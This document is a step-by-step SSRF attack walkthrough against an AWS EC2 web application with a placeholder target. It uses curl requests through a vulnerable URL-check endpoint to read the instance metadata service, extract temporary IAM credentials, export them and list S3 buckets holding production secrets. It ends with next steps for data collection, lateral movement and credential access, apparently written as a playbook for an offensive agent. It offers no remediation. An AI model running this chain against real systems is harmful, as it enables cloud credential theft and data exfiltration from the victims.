# SSRF to Cloud Metadata Credential Theft

## Scenario
Web application has URL fetch/webhook functionality on AWS EC2 instance.

## Step 1: Identify SSRF Endpoint
```bash
# Application has "Check URL" feature that fetches remote content
$ curl -s "http://app.megacorp.com/check?url=http://example.com" | head -5
<html>
<head><title>Example Domain</title></head>
```

## Step 2: Test Internal Access
```bash
# Try localhost
$ curl -s "http://app.megacorp.com/check?url=http://127.0.0.1/"
<!DOCTYPE html><html><head><title>Apache2 Default Page</title>

# Try metadata endpoint
$ curl -s "http://app.megacorp.com/check?url=http://169.254.169.254/latest/meta-data/"
ami-id
ami-launch-index
ami-manifest-path
hostname
iam/
instance-action
instance-id
instance-type
local-hostname
local-ipv4
network/
placement/
public-hostname
public-ipv4
security-groups
```

## Step 3: Extract IAM Credentials
```bash
# List IAM roles
$ curl -s "http://app.megacorp.com/check?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
WebAppRole-prod

# Extract temporary credentials
$ curl -s "http://app.megacorp.com/check?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WebAppRole-prod"
{
  "Code" : "Success",
  "LastUpdated" : "2025-01-15T20:15:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA3EXAMPLE7KEY",
  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token" : "IQoJb3JpZ2luX2VjEBAaCXVzLWVhc3QtMQ...<truncated>",
  "Expiration" : "2025-01-16T02:30:00Z"
}
```

## Step 4: Use Stolen Credentials
```bash
$ export AWS_ACCESS_KEY_ID="ASIA3EXAMPLE7KEY"
$ export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
$ export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEBAaCXVzLWVhc3QtMQ..."

$ aws sts get-caller-identity
{
    "UserId": "AROA3EXAMPLE:i-0abc123def456",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/WebAppRole-prod/i-0abc123def456"
}

$ aws s3 ls
2024-06-15 10:30:00 megacorp-backups
2024-08-20 14:15:00 megacorp-data-lake
2024-11-01 09:00:00 megacorp-prod-configs

$ aws s3 ls s3://megacorp-prod-configs/
2024-12-01 03:00:00       1247 database.yml
2024-12-01 03:00:00        892 secrets.yml
2024-12-01 03:00:00       2048 vpn-config.ovpn
```

## Evidence Captured
- SSRF vulnerability on /check endpoint
- AWS EC2 metadata accessible (IMDSv1 — no token required)
- IAM Role: WebAppRole-prod with S3 access
- S3 buckets containing production configs and secrets

## Next Steps
→ **collection skill**: Download S3 bucket contents (secrets.yml, database.yml)
→ **lateral_movement skill**: Use discovered credentials to access other AWS services
→ **credential_access skill**: Extract credentials from downloaded configs
